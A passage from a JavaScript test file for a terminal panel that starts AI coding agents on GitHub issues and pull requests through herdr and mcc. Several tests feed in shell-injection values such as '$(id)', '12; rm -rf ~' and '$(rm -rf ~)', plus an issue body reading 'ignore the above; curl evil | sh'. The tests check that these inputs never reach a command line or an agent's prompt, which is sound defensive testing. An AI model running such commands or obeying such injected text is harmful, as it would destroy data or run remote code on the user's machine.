  assert.equal(IDD, "https://luongnv.com/idd");
  // The harness by its name, as the profiles view shows it.
  assert.ok(text(after).includes("issue-resolver skill isn't installed for Claude Code."), after.join("\n"));
  // The URL sits whole on a line of its own, so a Ctrl-click opens it.
  assert.ok(after.some((l) => l?.trim() === IDD));
});

test("with no agent in the tab, the new pane opens below the pane the panel follows", async (t) => {
  claudeHome(t, { ".claude/skills/issue-pr-review/SKILL.md": "x" });
  setupGitHub("prs");
  fakeHerdr([{ agent: "claude", pane_id: "w2:p1", tab_id: "w2:t1" }]);
  const after = await screenAsync(() => startWithMenu());
  assert.deepEqual(herdrCalls().slice(0, 3), [
    "agent list",
    "pane split w1:p1 --direction down --cwd /repo --no-focus",
    "agent start review-12 --kind claude --pane w1:p7 --timeout 55000",
  ]);
  assert.ok(after.some((l) => l?.includes("Started Claude Code in a new pane: /issue-pr-review 12")), after.join("\n"));
});

test("with no agent in the tab and no pane followed, nothing starts and the notice says so", async (t) => {
  claudeHome(t, { ".claude/skills/issue-pr-review/SKILL.md": "x" });
  setupGitHub("prs");
  follow(null);
  fakeHerdr([{ agent: "claude", pane_id: "w2:p1", tab_id: "w2:t1" }]);
  const after = await screenAsync(() => startWithMenu());
  assert.deepEqual(herdrCalls(), ["agent list"]);
  assert.ok(after.some((l) => l?.includes("No agent in this tab")), after.join("\n"));
});

test("a row without a valid number gets no button, and the prompt takes integers only", () => {
  for (const number of [undefined, 0, -3, 1.5, "12", "12; rm -rf ~", NaN]) {
    setupGitHub("issues");
    ui.issues[2].number = number;
    const lines = screen(draw);
    assert.doesNotMatch(lines[0], /Resolve/, String(number));
    screen(() => onInput(Buffer.from("a")));
    assert.deepEqual(calls, [], String(number));
  }
  assert.throws(() => promptFor("claude", "issue-resolver", { number: "5 && x" }));
  assert.equal(promptFor("claude", "idd:issue-resolver", { number: 5 }), "/idd:issue-resolver 5");
});

test("a failed start shows herdr's reason and closes the new pane", async (t) => {
  claudeHome(t, { ".claude/skills/issue-resolver/SKILL.md": "x" });
  setupGitHub("issues");
  fakeHerdr(claudeHere, { "agent start": herdrFail("agent_exited", "claude exited before it was ready") });
  const after = await screenAsync(() => startWithMenu());
  assert.deepEqual(herdrCalls().slice(2), ["agent start resolve-12 --kind claude --pane w1:p7 --timeout 55000", "pane close w1:p7"]);
  assert.ok(after.map((l) => l?.trim()).join(" ").includes("Claude Code didn't start: claude exited before it was ready"), after.join("\n"));
});

test("an agent that asks something on start keeps its pane, waits for your answer, then gets the prompt", async (t) => {
  claudeHome(t, { ".claude/skills/issue-resolver/SKILL.md": "x" });
  setupGitHub("issues");
  fakeHerdr(claudeHere, { "agent start": herdrFail("agent_not_ready", "trust dialog") });
  // What the panel shows while herdr waits for your answer.
  let during;
  const answer = herdr;
  herdr = (args) => { if (args[1] === "wait") during = ui.notice; return answer(args); };
  let after = await screenAsync(() => startWithMenu());
  assert.ok(!herdrCalls().some((c) => c.startsWith("pane close")));
  assert.deepEqual(herdrCalls().slice(3), [
    "agent wait w1:p7 --until idle --timeout 300000",
    "agent prompt w1:p7 /issue-resolver 12 --wait --until working --until blocked --until done --timeout 15000",
  ]);
  assert.equal(during?.tone, "info");
  assert.equal(during?.text, "Claude Code is asking you something in the new pane. Answer it, and the panel sends: /issue-resolver 12");
  assert.ok(after.some((l) => l?.includes("Started Claude Code in a new pane: /issue-resolver 12")), after.join("\n"));
  // No answer in time: the pane stays, and the notice says what to send.
  setupGitHub("issues");
  fakeHerdr(claudeHere, { "agent start": herdrFail("agent_not_ready", "trust dialog"), "agent wait": herdrFail("timeout", "timed out") });
  after = await screenAsync(() => startWithMenu());
  assert.ok(!herdrCalls().some((c) => c.startsWith("pane close") || c.startsWith("agent prompt")));
  assert.match(after.map((l) => l?.trim()).join(" "), /isn't ready in the new pane\. When it is, send it: \/issue-resolver 12/, after.join("\n"));
});

test("a prompt left in the input box gets one more Enter; a failed prompt says what to send", async (t) => {
  claudeHome(t, { ".claude/skills/issue-resolver/SKILL.md": "x" });
  setupGitHub("issues");
  fakeHerdr(claudeHere, { "agent prompt": herdrFail("agent_prompt_stalled", "no working state within 5000 ms") });
  let after = await screenAsync(() => startWithMenu());
  assert.deepEqual(herdrCalls().slice(4), [
    "agent send-keys w1:p7 enter",
    "agent wait w1:p7 --until working --until blocked --until done --timeout 10000",
  ]);
  assert.ok(after.some((l) => l?.includes("Started Claude Code in a new pane: /issue-resolver 12")), after.join("\n"));
  // Still idle after the Enter.
  setupGitHub("issues");
  fakeHerdr(claudeHere, { "agent prompt": herdrFail("agent_prompt_stalled", "stalled"), "agent wait": herdrFail("timeout", "timed out") });
  after = await screenAsync(() => startWithMenu());
  assert.match(after.map((l) => l?.trim()).join(" "), /didn't act on the prompt\. Send it yourself in the new pane: \/issue-resolver 12/, after.join("\n"));
  // Any other failure sends no Enter.
  setupGitHub("issues");
  fakeHerdr(claudeHere, { "agent prompt": herdrFail("agent_blocked", "agent is blocked") });
  after = await screenAsync(() => startWithMenu());
  assert.ok(!herdrCalls().some((c) => c.startsWith("agent send-keys")));
  assert.match(after.map((l) => l?.trim()).join(" "), /the prompt failed \(agent is blocked\)\. Send it yourself in the new pane: \/issue-resolver 12/, after.join("\n"));
});

test("herdr missing or failing shows a red reason and starts nothing", async (t) => {
  claudeHome(t, { ".claude/skills/issue-resolver/SKILL.md": "x" });
  setupGitHub("issues");
  fakeHerdr(claudeHere, { "agent list": { code: 1, stderr: "connection refused\n" } });
  let after = await screenAsync(() => startWithMenu());
  assert.deepEqual(herdrCalls(), ["agent list"]);
  assert.ok(after.some((l) => l?.includes("Can't list agents: connection refused")), after.join("\n"));
  setupGitHub("issues");
  fakeHerdr(claudeHere, { "pane split": herdrFail("pane_not_found", "pane not found") });
  after = await screenAsync(() => startWithMenu());
  assert.equal(herdrCalls().length, 2);
  assert.ok(after.some((l) => l?.includes("Can't open a pane for Claude Code: pane not found")), after.join("\n"));
  setupGitHub("issues");
  fakeHerdr(claudeHere, { "agent list": { error: Object.assign(new Error("spawn herdr ENOENT"), { code: "ENOENT" }) } });
  after = await screenAsync(() => startWithMenu());
  assert.deepEqual(herdrCalls(), ["agent list"]);
  assert.ok(after.some((l) => l?.includes("Can't list agents: herdr isn't installed")), after.join("\n"));
});

test("one launch at a time: a second press while starting does nothing", async (t) => {
  claudeHome(t, { ".claude/skills/issue-resolver/SKILL.md": "x" });
  setupGitHub("issues");
  fakeHerdr(claudeHere);
  let during, menu;
  // Chosen from the menu, the launch is under way: a, the button and j while it
  // starts neither open the menu again nor start a second agent.
  await screenAsync(() => { startWithMenu(); onInput(Buffer.from("a")); act(); onInput(Buffer.from("j")); menu = ui.menu; during = ui.notice; });
  assert.equal(menu, null, "a press while starting opened the menu");
  assert.equal(during?.tone, "info", "a key hid the launch's progress");
  assert.equal(herdrCalls().filter((c) => c === "agent list").length, 1);
  assert.equal(herdrCalls().filter((c) => c.startsWith("agent start")).length, 1);
});

test("a skill Claude has only from a plugin is found, under its plugin's name", async (t) => {
  const cache = ".claude/plugins/cache/market/idd/0.20.1";
  const dir = home(t, {
    [`${cache}/skills/issue-resolver/SKILL.md`]: "x",
    [`${cache}/.claude-plugin/plugin.json`]: JSON.stringify({ name: "idd" }),
    ".claude/plugins/synced/acct/abc123/issue-pr-review/SKILL.md": "x",
    ".claude/plugins/synced/acct/abc123/.claude-plugin/plugin.json": JSON.stringify({ name: "idd" }),
  });
  useProfiles(dir, [{ id: "cc", name: "Claude Code", harness: "claude" }], { resolve: "cc" });
  // Cached but not installed: not found.
  assert.equal(findSkill("claude", "issue-resolver", "/repo"), null);
  const installed = { version: 2, plugins: { "idd@market": [{ scope: "user", installPath: path.join(dir, cache) }] } };
  fs.writeFileSync(path.join(dir, ".claude/plugins/installed_plugins.json"), JSON.stringify(installed));
  assert.equal(findSkill("claude", "issue-resolver", "/repo"), "idd:issue-resolver");
  assert.equal(findSkill("claude", "issue-pr-review", "/repo"), "idd:issue-pr-review");
  // Claude plugins aren't another agent's skills; a repo's own skills folder is.
  assert.equal(findSkill("codex", "issue-resolver", "/repo"), null);
  fs.mkdirSync(path.join(dir, "repo", ".codex", "skills", "issue-resolver"), { recursive: true });
  fs.writeFileSync(path.join(dir, "repo", ".codex", "skills", "issue-resolver", "SKILL.md"), "x");
  assert.equal(findSkill("codex", "issue-resolver", path.join(dir, "repo")), "issue-resolver");
  setupGitHub("issues");
  fakeHerdr(claudeHere);
  await screenAsync(() => startWithMenu());
  assert.equal(herdrCalls().at(-1), "agent prompt w1:p7 /idd:issue-resolver 12 --wait --until working --until blocked --until done --timeout 15000");
});

test("a skill from a disabled Claude plugin counts as missing: nothing starts", async (t) => {
  const cache = ".claude/plugins/cache/market/idd/0.20.1";
  const dir = home(t, {
    [`${cache}/skills/issue-resolver/SKILL.md`]: "x",
    ".claude/settings.json": JSON.stringify({ enabledPlugins: { "idd@market": false } }),
  });
  useProfiles(dir, [{ id: "cc", name: "Claude Code", harness: "claude" }], { resolve: "cc" });
  const installed = { version: 2, plugins: { "idd@market": [{ scope: "user", installPath: path.join(dir, cache) }] } };
  fs.writeFileSync(path.join(dir, ".claude/plugins/installed_plugins.json"), JSON.stringify(installed));
  assert.equal(findSkill("claude", "issue-resolver", "/repo"), null);
  setupGitHub("issues");
  fakeHerdr(claudeHere);
  const after = await screenAsync(() => startWithMenu());
  assert.deepEqual(herdrCalls(), ["agent list"]);
  assert.ok(after.some((l) => l?.trim() === IDD), after.join("\n"));
  // Enabled again, under the plugin's key name when it has no plugin.json.
  fs.writeFileSync(path.join(dir, ".claude/settings.json"), JSON.stringify({ enabledPlugins: { "idd@market": true } }));
  assert.equal(findSkill("claude", "issue-resolver", "/repo"), "idd:issue-resolver");
});

// ── Profiles: per-row buttons, harnesses, mcc ───────────────────────────────

const PATH = process.env.PATH;
// PATH set to exactly one new folder, holding an executable mcc unless `present`
// is false; restored after the test.
function mccOnPath(t, present = true) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "herdr-github-bin-"));
  if (present) {
    fs.writeFileSync(path.join(dir, "mcc"), "#!/bin/sh\nexit 0\n");
    fs.chmodSync(path.join(dir, "mcc"), 0o755);
  }
  process.env.PATH = dir;
  t.after(() => { process.env.PATH = PATH; fs.rmSync(dir, { recursive: true, force: true }); });
  return path.join(dir, "mcc");
}
// An mcc whose `env -q --shell bash` prints what it prints for a profile folder.
const mccEnv = (dir) => { mcc = (args) => args[0] === "env" ? { code: 0, stdout: `export CLAUDE_CONFIG_DIR='${dir}'\nunset MCC_PROFILE\n` } : { code: 1, stderr: "unexpected" }; };
const mccCalls = () => calls.filter((c) => c[0] === "mcc").map((c) => c.slice(1).join(" "));
// Claude Code showing up in the new pane w1:p7 on the given agent-list poll, in `status`.
const appears = (status, on = 1) => (n) => ok({ agents: [...claudeHere, ...(n >= on ? [{ agent: "claude", pane_id: "w1:p7", tab_id: "w1:t1", agent_status: status }] : [])] });
const text = (lines) => lines.map((l) => l?.trim()).join(" ");

test("with no profile assigned, Resolve starts Claude Code through mcc run, with the skills of mcc's profile", async (t) => {
  const dir = home(t, { ".mcc/profiles/work/skills/issue-resolver/SKILL.md": "x" });
  const bin = mccOnPath(t);
  mccEnv(path.join(dir, ".mcc/profiles/work"));
  setupGitHub("issues");
  fakeHerdr(claudeHere, { "agent list": appears("working", 2) });
  const after = await screenAsync(() => onInput(Buffer.from("a")));
  assert.deepEqual(herdrCalls(), [
    "agent list",
    "pane split w1:p1 --direction down --cwd /repo --no-focus",
    `pane run w1:p7 '${bin}' 'run' '--' '/issue-resolver 12'`,
    "agent list",
    "agent list",
    "agent wait w1:p7 --until idle --until working --until blocked --timeout 30000",
    "agent list",
  ]);
  // mcc env runs in the repo, so it names the profile `mcc run` starts there.
  assert.deepEqual(mccCalls(), ["env -q --shell bash"]);
  assert.equal(callOpts[calls.findIndex((c) => c[0] === "mcc")].cwd, "/repo");
  assert.ok(text(after).includes("Started Claude Code via mcc run in a new pane: /issue-resolver 12"), after.join("\n"));
});

test("an mcc profile's model and thinking level go to claude after --, in one quoted line", async (t) => {
  const dir = home(t, { ".claude/skills/issue-pr-review/SKILL.md": "x" });
  useProfiles(dir, [{ id: "deep", name: "Deep", harness: "mcc", model: "opus", thinking: "max" }], { review: "deep" });
  const bin = mccOnPath(t);
  mccEnv(path.join(dir, ".claude"));
  setupGitHub("prs");
  fakeHerdr(claudeHere, { "agent list": appears("idle") });
  const after = await screenAsync(() => startWithMenu());
  assert.equal(herdrCalls()[2], `pane run w1:p7 '${bin}' 'run' '--' '--model' 'opus' '--effort' 'max' '/issue-pr-review 12'`);
  assert.equal(calls.find((c) => c[1] === "pane" && c[2] === "run").length, 5, "the command line is one argument");
  assert.ok(after.some((l) => l?.includes("Started Claude Code via mcc run")), after.join("\n"));
});

test("mcc that never shows Claude Code, or shows it blocked, gets the waiting notice, never Started", async (t) => {
  const dir = home(t, { ".claude/skills/issue-resolver/SKILL.md": "x" });
  mccOnPath(t);
  mccEnv(path.join(dir, ".claude"));
  // What to do comes first.
  const waiting = "Answer mcc in the new pane: it is waiting there, maybe asking about a usage limit.";
  // Never there: polls until the deadline, then no wait.
  setupGitHub("issues");
  fakeHerdr(claudeHere);
  let after = await screenAsync(() => onInput(Buffer.from("a")));
  assert.ok(herdrCalls().filter((c) => c === "agent list").length > 2);
  assert.ok(!herdrCalls().some((c) => c.startsWith("agent wait")));
  assert.ok(text(after).includes(waiting), after.join("\n"));
  assert.ok(!text(after).includes("Started"), after.join("\n"));
  // There, but blocked: asking something.
  setupGitHub("issues");
  fakeHerdr(claudeHere, { "agent list": appears("blocked") });
  after = await screenAsync(() => onInput(Buffer.from("a")));
  assert.ok(herdrCalls().some((c) => c.startsWith("agent wait w1:p7")));
  assert.ok(text(after).includes(waiting) && !text(after).includes("Started"), after.join("\n"));
  // Gone by the time herdr waits on it.
  setupGitHub("issues");
  fakeHerdr(claudeHere, { "agent list": appears("working"), "agent wait": herdrFail("agent_not_found", "agent target w1:p7 not found") });
  after = await screenAsync(() => onInput(Buffer.from("a")));
  assert.ok(text(after).includes(waiting) && !text(after).includes("Started"), after.join("\n"));
});

test("without mcc on PATH, the default profile starts nothing and says so", async (t) => {
  home(t, { ".claude/skills/issue-resolver/SKILL.md": "x" });
  mccOnPath(t, false);
  setupGitHub("issues");
  fakeHerdr(claudeHere);
  const after = await screenAsync(() => onInput(Buffer.from("a")));
  assert.deepEqual(calls, []);
  assert.ok(text(after).includes("mcc isn't on your PATH"), after.join("\n"));
});

test("when mcc env names no folder, the skill isn't found and nothing starts", async (t) => {
  home(t, { ".claude/skills/issue-resolver/SKILL.md": "x" });
  mccOnPath(t);
  mcc = () => ({ code: 0, stdout: "something else\n" });
  setupGitHub("issues");
  fakeHerdr(claudeHere);
  let after = await screenAsync(() => onInput(Buffer.from("a")));
  assert.deepEqual(herdrCalls(), ["agent list"]);
  assert.ok(text(after).includes("issue-resolver skill isn't found for mcc"), after.join("\n"));
  assert.ok(after.some((l) => l?.trim() === IDD));
  mcc = () => ({ code: 2, stderr: "no such profile\n" });
  setupGitHub("issues");
  after = await screenAsync(() => onInput(Buffer.from("a")));
  assert.ok(text(after).includes("mcc env failed: no such profile"), after.join("\n"));
});

test("each harness starts with its own model and thinking flags; empty ones add none", async (t) => {
  const dir = home(t, { ".agents/skills/issue-resolver/SKILL.md": "x" });
  const cases = [
    [{ harness: "claude", model: "sonnet", thinking: "high" }, "--kind claude --pane w1:p7 --timeout 55000 -- --model sonnet --effort high"],
    [{ harness: "codex", model: "gpt-5", thinking: "high" }, `--kind codex --pane w1:p7 --timeout 55000 -- -m gpt-5 -c model_reasoning_effort="high"`],
    [{ harness: "pi", model: "anthropic/claude-x", thinking: "minimal" }, "--kind pi --pane w1:p7 --timeout 55000 -- --model anthropic/claude-x --thinking minimal"],
    [{ harness: "pi" }, "--kind pi --pane w1:p7 --timeout 55000"],
    [{ harness: "opencode", model: "x" }, "--kind opencode --pane w1:p7 --timeout 55000"],
  ];
  for (const [p, start] of cases) {
    useProfiles(dir, [{ id: "p", name: "P", ...p }], { resolve: "p" });
    setupGitHub("issues");
    fakeHerdr(claudeHere);
    const after = await screenAsync(() => startWithMenu());
    assert.equal(herdrCalls()[2], `agent start resolve-12 ${start}`, JSON.stringify(p));
    assert.equal(text(after).includes("OpenCode ignores this profile's model and thinking level"), p.harness === "opencode", after.join("\n"));
  }
});

test("each issue row has its own Resolve button, which resolves that issue", async (t) => {
  claudeHome(t, { ".claude/skills/issue-resolver/SKILL.md": "x" });
  const lines = setupGitHub("issues");
  const y = lines.findIndex((l) => l?.trim() === "Resolve #11");
  assert.ok(y > LIST.from, lines.join("\n"));
  fakeHerdr(claudeHere);
  const x = lines[y].indexOf("Resolve");
  // Beside the button the line is the row's, and opens it.
  screen(() => click(lines[y].length + 2, y));
  assert.deepEqual(opened, ["https://x/issues/1"]);
  assert.deepEqual(calls, []);
  opened.length = 0;
  const after = await screenAsync(() => clickWithMenu(x, y));
  assert.deepEqual(opened, []);
  assert.equal(ui.sel.issues, 1);
  assert.equal(herdrCalls()[2], "agent start resolve-11 --kind claude --pane w1:p7 --timeout 55000");
  assert.ok(text(after).includes("Started Claude Code in a new pane: /issue-resolver 11"), after.join("\n"));
  // Pull requests get Review buttons; GitLab rows get none.
  assert.ok(setupGitHub("prs").some((l) => l?.trim() === "Review #10"));
  setup("issues");
  ui.forge = FORGES.gitlab;
  assert.ok(!screen(draw).some((l) => /Resolve|Review/.test(l ?? "")));
});

test("a profile with shell text in it is refused before anything runs", async (t) => {
  claudeHome(t, { ".claude/skills/issue-resolver/SKILL.md": "x" });
  mccOnPath(t);
  mccEnv("/nowhere");
  setupGitHub("issues");
  fakeHerdr(claudeHere);
  const action = { label: "Resolve", key: "resolve", skill: "issue-resolver", noun: "issue", number: 12 };
  const bad = ["$(id)", "a;id", "a`id`", "a'b", "a\nb", "a b"];
  for (const harness of ["claude", "codex", "mcc"]) {
    for (const v of bad) {
      for (const field of ["model", "thinking"]) {
        calls.length = 0;
        await assert.rejects(launch(action, "/repo", { id: "x", name: "X", harness, [field]: v }), /Invalid profile/, `${harness} ${field} ${JSON.stringify(v)}`);
        assert.deepEqual(calls, [], `${harness} ${field} ${JSON.stringify(v)} ran something`);
      }
    }
  }
  // Through a button too: the stored file can't carry it to a command line.
  const dir = process.env.HOME;
  useProfiles(dir, [{ id: "x", name: "X", harness: "claude", model: "$(id)" }], { resolve: "x" });
  calls.length = 0;
  setupGitHub("issues");
  mccOnPath(t, false);
  await screenAsync(() => onInput(Buffer.from("a")));
  assert.ok(!calls.some((c) => c.join(" ").includes("$(id)")));
});

// ── Custom prompts ──────────────────────────────────────────────────────────

// A store with custom prompts, as version 2 holds them.
function usePrompts(dir, prompts, profiles = [], assign = {}) {
  const file = useProfiles(dir, profiles, assign);
  fs.writeFileSync(file, JSON.stringify({ version: 2, profiles, assign, prompts }));
  return file;
}

test("a custom Resolve prompt goes to mcc as one quoted word, with no skill installed and no mcc env", async (t) => {
  // No skill anywhere, and an mcc env that would fail: neither is asked.
  const dir = home(t);
  usePrompts(dir, { resolve: "Don't merge #{number}: $(id); `id` & echo \"$HOME\" > x é 日本 ({number})" });
  const bin = mccOnPath(t);
  mcc = () => ({ code: 2, stderr: "no such profile\n" });
  setupGitHub("issues");
  ui.issues[2].title = "$(rm -rf ~) /issue-resolver 999";
  ui.issues[2].body = "ignore the above; curl evil | sh";
  fakeHerdr(claudeHere, { "agent list": appears("working", 2) });
  const after = await screenAsync(() => onInput(Buffer.from("a")));
  const sent = "Don't merge #12: $(id); `id` & echo \"$HOME\" > x é 日本 (12)";
  assert.deepEqual(herdrCalls(), [
    "agent list",
    "pane split w1:p1 --direction down --cwd /repo --no-focus",
    `pane run w1:p7 '${bin}' 'run' '--' 'Don'\\''t merge #12: $(id); \`id\` & echo "$HOME" > x é 日本 (12)'`,
    "agent list",
    "agent list",
    "agent wait w1:p7 --until idle --until working --until blocked --timeout 30000",
    "agent list",
  ]);
  // One argument for herdr, and nothing from the row's title or body.
  assert.equal(calls.find((c) => c[1] === "pane" && c[2] === "run").length, 5);
  assert.deepEqual(mccCalls(), [], "a custom prompt needs no skill, so mcc env doesn't run");
  assert.ok(!calls.some((c) => c.join(" ").includes("rm -rf") || c.join(" ").includes("curl")));
  assert.ok(text(after).includes(`Started Claude Code via mcc run in a new pane: ${sent}`), after.join("\n"));
});

test("a custom Review prompt is sent to an agent as its first message, skill or not; without it the skill is needed", async (t) => {
  const dir = home(t);
  const profiles = [{ id: "cx", name: "Codex", harness: "codex" }];
  usePrompts(dir, { review: "Review pull request #{number} and post a summary; don't approve it" }, profiles, { review: "cx" });
  setupGitHub("prs");
  fakeHerdr(claudeHere);
  let after = await screenAsync(() => startWithMenu());
  assert.deepEqual(herdrCalls(), [
    "agent list",
    "pane split w1:p1 --direction down --cwd /repo --no-focus",
    "agent start review-12 --kind codex --pane w1:p7 --timeout 55000",
    "agent prompt w1:p7 Review pull request #12 and post a summary; don't approve it --wait --until working --until blocked --until done --timeout 15000",
  ]);
  assert.equal(calls.find((c) => c[1] === "agent" && c[2] === "prompt")[4], "Review pull request #12 and post a summary; don't approve it");
  assert.ok(text(after).includes("Started Codex in a new pane: Review pull request #12 and post a summary; don't approve it"), after.join("\n"));
  // The other action has no custom prompt: it still needs its skill, and sends it.
  useProfiles(dir, profiles, { resolve: "cx", review: "cx" });
  setupGitHub("prs");
  after = await screenAsync(() => startWithMenu());
  assert.deepEqual(herdrCalls(), ["agent list"]);
  assert.ok(text(after).includes("issue-pr-review skill isn't installed for Codex."), after.join("\n"));
  fs.mkdirSync(path.join(dir, ".agents/skills/issue-resolver"), { recursive: true });
  fs.writeFileSync(path.join(dir, ".agents/skills/issue-resolver/SKILL.md"), "x");
  usePrompts(dir, { review: "Review #{number}" }, profiles, { resolve: "cx", review: "cx" });
  setupGitHub("issues");
  await screenAsync(() => startWithMenu());
  assert.equal(herdrCalls().at(-1), "agent prompt w1:p7 Use the issue-resolver skill on issue #12. --wait --until working --until blocked --until done --timeout 15000");
});

test("a custom prompt that can't be sent is refused before anything runs", async (t) => {
  home(t);
  mccOnPath(t);
  setupGitHub("issues");
  fakeHerdr(claudeHere);
  const action = { label: "Resolve", key: "resolve", skill: "issue-resolver", noun: "issue", number: 12 };
  for (const template of ["-x {number}", "a\nb {number}", "a\\b {number}", "a‮{number}", `${"x".repeat(499)}{number}`]) {
    calls.length = 0;
    await assert.rejects(launch(action, "/repo", P.DEFAULT_PROFILE, template), /Invalid prompt/, JSON.stringify(template));
    assert.deepEqual(calls, [], JSON.stringify(template));
  }
  assert.equal(promptFor("claude", null, { number: 5 }, "Fix {number}, then #{number}"), "Fix 5, then #5");
  assert.throws(() => promptFor("claude", null, { number: "5; id" }, "Fix {number}"), /not a number/);
});

// ── The profile views ───────────────────────────────────────────────────────

// Runs fn with process.exit recorded rather than done.
function noExit(fn) {
  const { exit } = process;
  let code = null;
  process.exit = (c) => { code = c ?? 0; };
  try { fn(); } finally { process.exit = exit; }
  return code;
}
const storeFile = () => readStore().file;

test("s opens the profiles; a new profile is typed, saved and assigned, then used", async (t) => {
  claudeHome(t, { ".agents/skills/issue-resolver/SKILL.md": "x" });
  fs.rmSync(storeFile());
  setupGitHub("issues");
  let lines = screen(() => onInput(Buffer.from("s")));
  assert.match(lines[0], /Agent profiles/);
  assert.match(lines.join("\n"), /Claude Code via mcc run +default · Resolve · Review/);
  // In the form, q and j are text, and Esc goes back without closing the panel.
  const exit = noExit(() => screen(() => {
    onInput(Buffer.from("n"));
    onInput(Buffer.from("Quick job"));
    onInput(Buffer.from("\x1b[B"));
    onInput(Buffer.from("qj"));
    onInput(Buffer.from("\x1b[B\x1b[C\x1b[C"));
    onInput(Buffer.from("\x1b[B"));
    onInput(Buffer.from("gpt-5"));
    onInput(Buffer.from("\x1b[B\x1b[C"));
  }));
  assert.equal(exit, null, "a key in the form closed the panel");
  assert.equal(ui.settings.mode, "edit");
  assert.deepEqual({ ...ui.settings.form, prev: undefined }, { prev: undefined, name: "Quick job", id: "qj", harness: "codex", model: "gpt-5", thinking: "low" });
  lines = screen(() => onInput(Buffer.from("\r")));
  assert.equal(ui.settings.mode, "list");
  assert.ok(lines.some((l) => l?.includes("Saved Quick job")), lines.join("\n"));
  screen(() => onInput(Buffer.from("R")));
  assert.deepEqual(JSON.parse(fs.readFileSync(storeFile(), "utf8")), {
    version: 1, profiles: [{ id: "qj", name: "Quick job", harness: "codex", model: "gpt-5", thinking: "low" }], assign: { resolve: "qj", review: null },
  });
  assert.equal(noExit(() => screen(() => onInput(Buffer.from("\x1b")))), null);
  assert.equal(ui.settings, null);
  fakeHerdr(claudeHere);
  await screenAsync(() => startWithMenu());
  assert.equal(herdrCalls()[2], `agent start resolve-12 --kind codex --pane w1:p7 --timeout 55000 -- -m gpt-5 -c model_reasoning_effort="low"`);
});

test("a click inside the profile views opens nothing and starts nothing", (t) => {
  claudeHome(t);
  setupGitHub("issues");
  screen(() => onInput(Buffer.from("s")));
  for (const mode of ["list", "edit"]) {
    if (mode === "edit") {
      screen(() => onInput(Buffer.from("n")));
      assert.equal(ui.settings.mode, "edit", "the list's clicks left n anywhere but the form");
    }
    for (let y = 0; y < 24; y++) {
      if (y === 0) continue; // ✕ goes back
      screen(() => onInput(Buffer.from(press(y))));
      assert.deepEqual(opened, [], `${mode} line ${y}`);
      assert.deepEqual(calls, [], `${mode} line ${y}`);
      assert.ok(ui.settings, `${mode} line ${y} closed the view`);
    }
  }
  // ✕ goes back: to the list, then to the rows.
  screen(() => onInput(Buffer.from(press(0).replace("<0;5;", "<0;60;"))));
  assert.equal(ui.settings.mode, "list");
  screen(() => onInput(Buffer.from(press(0).replace("<0;5;", "<0;60;"))));
  assert.equal(ui.settings, null);
});

test("the header's ⚙ opens the profiles; e edits and d deletes, and the default stays", (t) => {
  const dir = claudeHome(t);
  const lines = setupGitHub("issues");
  screen(() => click(lines[0].indexOf("⚙"), 0));
  assert.equal(ui.settings?.mode, "list");
  // The default can't be edited or deleted.
  let shown = screen(() => onInput(Buffer.from("e")));
  assert.ok(text(shown).includes("default profile can't be changed"));
  assert.equal(ui.settings.mode, "list");
  // Rename cc's id: its assignments follow it.
  screen(() => onInput(Buffer.from("je\x1b[B\x7f\x7fmine\r")));
  let store = JSON.parse(fs.readFileSync(storeFile(), "utf8"));
  assert.deepEqual(store.profiles.map((p) => p.id), ["mine"]);
  assert.deepEqual(store.assign, { resolve: "mine", review: "mine" });
  // An invalid model stays in the form with the reason.
  shown = screen(() => onInput(Buffer.from("e\x1b[B\x1b[B\x1b[Bopus[1m]\r")));
  assert.equal(ui.settings.mode, "edit");
  assert.ok(text(shown).includes("Model:"), shown.join("\n"));
  screen(() => onInput(Buffer.from("\x1b")));
  assert.equal(ui.settings.mode, "list");
  // d asks first; n keeps it, y deletes it and its assignments.
  screen(() => onInput(Buffer.from("dn")));
  assert.equal(JSON.parse(fs.readFileSync(storeFile(), "utf8")).profiles.length, 1);
  screen(() => onInput(Buffer.from("dy")));
  store = JSON.parse(fs.readFileSync(storeFile(), "utf8"));
  assert.deepEqual(store, { version: 1, profiles: [], assign: { resolve: null, review: null } });
  // It was the last one listed: the selection moves up to what's left, and the
  // next keys work rather than throw.
  assert.equal(ui.settings.sel, 0);
  assert.equal(noExit(() => assert.doesNotThrow(() => screen(() => onInput(Buffer.from("j"))))), null);
  assert.equal(ui.settings?.mode, "list");
  assert.equal(noExit(() => assert.doesNotThrow(() => screen(() => onInput(Buffer.from("\x1b"))))), null);
  assert.equal(ui.settings, null);
  assert.ok(dir);
});

test("a store changed elsewhere since it was read isn't overwritten", (t) => {
  claudeHome(t);
  setupGitHub("issues");
  screen(() => onInput(Buffer.from("s")));
  const theirs = JSON.stringify({ version: 1, profiles: [{ id: "app", name: "From the app", harness: "pi" }], assign: { resolve: "app" } });
  fs.writeFileSync(storeFile(), theirs);
  const shown = screen(() => onInput(Buffer.from("jR")));
  assert.equal(fs.readFileSync(storeFile(), "utf8"), theirs);
  assert.ok(text(shown).includes("changed elsewhere"), shown.join("\n"));
  // Read again, so the next change goes through.
  assert.match(shown.join("\n"), /From the app/);
  screen(() => onInput(Buffer.from("V")));
  assert.equal(JSON.parse(fs.readFileSync(storeFile(), "utf8")).assign.review, "app");
  assert.ok(!fs.readdirSync(path.dirname(storeFile())).some((f) => f.endsWith(".tmp")));
});

test("a corrupt or newer store is shown read only, and actions use the default", async (t) => {
  const dir = home(t, { ".claude/skills/issue-resolver/SKILL.md": "x" });
  for (const bad of ["{ not json", JSON.stringify({ version: 3, profiles: [], assign: {} })]) {
    const file = useProfiles(dir, []);
    fs.writeFileSync(file, bad);
    setupGitHub("issues");
    const shown = screen(() => onInput(Buffer.from("s")));
    assert.ok(/isn't valid JSON|read only/.test(text(shown)), shown.join("\n"));
    const after = screen(() => onInput(Buffer.from("R")));
    assert.ok(text(after).includes("Not saved"), after.join("\n"));
    assert.equal(fs.readFileSync(file, "utf8"), bad);
    screen(() => onInput(Buffer.from("\x1b")));
  }
  // An assigned profile that's gone: the default, through mcc.
  useProfiles(dir, [], { resolve: "gone" });
  mccOnPath(t, false);
  setupGitHub("issues");
  const after = await screenAsync(() => onInput(Buffer.from("a")));
  assert.ok(text(after).includes("mcc isn't on your PATH"), after.join("\n"));
});

// Like screen, at another size.
function screenAt(cols, rows, fn) {
  const { columns, rows: before } = process.stdout;
  process.stdout.columns = cols; process.stdout.rows = rows;
  const { write } = process.stdout;
  let frame = "";
  process.stdout.write = (x) => { frame = x; return true; };
  try { fn(); } finally { Object.assign(process.stdout, { write, columns, rows: before }); }
  const lines = [];
